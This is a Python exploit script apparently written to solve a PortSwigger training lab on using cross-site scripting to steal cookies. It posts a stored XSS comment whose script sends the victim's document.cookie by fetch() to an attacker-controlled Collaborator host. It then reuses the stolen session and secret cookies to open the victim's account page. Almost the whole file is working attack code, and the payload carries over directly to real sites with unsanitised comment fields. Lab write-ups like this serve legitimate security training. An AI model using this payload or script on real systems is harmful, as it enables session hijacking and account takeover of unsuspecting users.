# Exploiting cross-site scripting to steal cookies

# https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def send_xss(s, url, collab):
	form_path = url + '/post?postId=1'
	r = s.get(form_path)
	csrf_token = get_csrf_token(r)
	comment_path = url + '/post/comment'
	xss_payload = '</p><script>fetch("https://' + collab + '",{mode:"no-cors",method:"POST",body:document.cookie})</script>'
	comment_data = {
		"csrf": csrf_token,
		"postId": "1",
		"email": "test@attacker.com",
		"name": "gwyo",
		"website": "",
		"comment": xss_payload
	}
	print('[+] Targeted endpoint or query parameter:\n    %s' % comment_path)
	print('[+] Using payload in website field:\t%s' % xss_payload)
	r = s.post(comment_path, data=comment_data)
	time.sleep(1)
	print('\n[+] Check your Collaborator and give the cookie VALUES to continue...')
	session_cookie = input('Session cookie:\n> ')
	secret_cookie = input('Secret cookie:\n> ')
	cookie = {"secret": secret_cookie, "session": session_cookie}
	return cookie


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Exploiting cross-site scripting to steal cookies')
	parser = argparse.ArgumentParser(description="[+] Lab: Exploiting cross-site scripting to steal cookies")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	parser.add_argument('-C',dest='collab',required=True, help="Collaborator URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	collab = args.collab
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print("[+] Trying to send a comment to steal admin's cookie...")
			victim_cookies = send_xss(s, url, collab)
			time.sleep(1)
			print('[+] Trying log in as Admin with stolen Cookie Session...')
			r = s.get(url + "/my-account", cookies=victim_cookies)
			time.sleep(2)
			if r.status_code == 200:
				s.cookies.clear()
				s.headers.clear()
				time.sleep(3)
				r = s.get(url)
				if  'Congratulations, you solved the lab!' in r.text:
					print('[+] The lab is solved')
				else:
					print('[+] The Exploit sent the given payload !')
			else:
				print('[-] The Exploit failed <!>')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()

